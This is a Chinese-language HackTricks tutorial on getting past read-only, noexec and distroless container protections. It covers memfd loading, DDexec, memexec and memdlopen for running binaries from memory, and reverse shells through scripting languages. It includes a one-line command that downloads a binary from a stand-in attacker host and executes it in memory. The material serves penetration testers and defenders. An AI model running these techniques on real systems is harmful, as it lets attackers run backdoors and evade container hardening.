# 绕过文件系统保护：只读 / 禁止执行 / 无发行版

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 视频

在以下视频中，您可以找到本页提到的技术的更深入解释：

* [**DEF CON 31 - 探索Linux内存操作以实现隐蔽和规避**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**使用DDexec-ng和内存中的dlopen()进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## 只读 / 禁止执行场景

在容器中，越来越常见的是发现安装了**只读(ro)文件系统保护**的linux机器。这是因为在`securitycontext`中设置**`readOnlyRootFilesystem: true`**就可以轻松运行具有ro文件系统的容器：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统被挂载为ro，**`/dev/shm`** 仍然是可写的，所以我们并非不能在磁盘上写入任何东西。然而，这个文件夹将会被**挂载为禁止执行保护**，所以如果你在这里下载了一个二进制文件，你**将无法执行它**。

{% hint style="warning" %}
从红队的角度来看，这使得**下载和执行**系统中原本不存在的二进制文件（如后门或枚举器如`kubectl`）变得**复杂**。
{% endhint %}

## 最简单的绕过方法：脚本

注意我提到的是二进制文件，只要解释器在机器内部，你可以**执行任何脚本**，比如如果存在`sh`，就可以执行**shell脚本**，或者如果安装了`python`，就可以执行**python脚本**。

然而，这还不足以执行你的二进制后门或其他你可能需要运行的二进制工具。

## 内存绕过

如果你想执行一个二进制文件，但文件系统不允许，最好的方法是**从内存中执行**，因为**保护措施在那里不适用**。

### 文件描述符 + exec系统调用绕过

如果机器内部有一些强大的脚本引擎，如**Python**、**Perl**或**Ruby**，你可以从内存中下载要执行的二进制文件，将其存储在内存文件描述符（`create_memfd`系统调用）中，这不会受到那些保护的影响，然后调用**`exec`系统调用**，指示**文件描述符作为要执行的文件**。

为此，你可以轻松使用项目[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。你可以传递一个二进制文件，它将生成一个指定语言的脚本，其中包含**压缩和b64编码的二进制文件**，以及**解码和解压缩**到通过调用`create_memfd`系统调用创建的**文件描述符**中的指令，以及调用**exec**系统调用来运行它的指令。

{% hint style="warning" %}
这在其他脚本语言如PHP或Node中不起作用，因为它们没有任何**默认方式调用原始系统调用**，所以不可能调用`create_memfd`来创建**内存文件描述符**以存储二进制文件。

此外，在`/dev/shm`中创建一个**常规文件描述符**也不会起作用，因为你将不被允许运行它，因为**禁止执行保护**将适用。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)是一种技术，允许你**修改自己进程的内存**，通过覆盖其**`/proc/self/mem`**。

因此，**控制正在执行的汇编代码**，你可以编写一个**shellcode**并"变异"进程来**执行任意代码**。

{% hint style="success" %}
**DDexec / EverythingExec**将允许你加载并**执行**你自己的**shellcode**或**任何二进制文件**从**内存**中。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
有关此技术的更多信息，请查看 Github 或：

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的自然下一步。它是一个 **DDexec shellcode 守护进程**，所以每次你想要 **运行不同的二进制文件** 时，你不需要重新启动 DDexec，你可以通过 DDexec 技术运行 memexec shellcode，然后 **与这个守护进程通信以传递新的二进制文件来加载和运行**。

你可以在 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) 找到如何使用 **memexec 从 PHP 反向 shell 执行二进制文件** 的示例。

### Memdlopen

与 DDexec 目的相似，[**memdlopen**](https://github.com/arget13/memdlopen) 技术允许一种 **更简单的方式来加载内存中的二进制文件** 以便后续执行。它甚至可以加载带有依赖项的二进制文件。

## Distroless 绕过

### 什么是 distroless

Distroless 容器只包含运行特定应用程序或服务所必需的 **最少组件**，例如库和运行时依赖项，但排除了更大的组件，如包管理器、shell 或系统工具。

Distroless 容器的目标是通过消除不必要的组件并最小化可被利用的漏洞数量，**减少容器的攻击面**。

### 反向 Shell

在 distroless 容器中，你可能甚至找不到 `sh` 或 `bash` 来获取常规 shell。你也不会找到如 `ls`、`whoami`、`id` 等二进制文件... 通常在系统中运行的一切。

{% hint style="warning" %}
因此，你 **无法** 获取 **反向 shell** 或像往常一样 **枚举** 系统。
{% endhint %}

然而，如果受损的容器正在运行例如 flask web，那么 python 就安装了，因此你可以获取 **Python 反向 shell**。如果它运行 node，你可以获取 Node 反向 shell，对于几乎所有的 **脚本语言** 也是如此。

{% hint style="success" %}
使用脚本语言，你可以使用语言的功能 **枚举系统**。
{% endhint %}

如果没有 **只读/无执行** 保护，你可以滥用你的反向 shell 在文件系统中 **写入你的二进制文件** 并 **执行** 它们。

{% hint style="success" %}
然而，在这类容器中，这些保护通常会存在，但你可以使用 **前面的内存执行技术来绕过它们**。
{% endhint %}

你可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 找到如何 **利用一些 RCE 漏洞** 来获取脚本语言 **反向 shell** 并从内存中执行二进制文件的 **示例**。

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零到英雄学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks 中看到你的公司广告** 或 **以 PDF 格式下载 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来 **分享你的黑客技巧**。

</details>
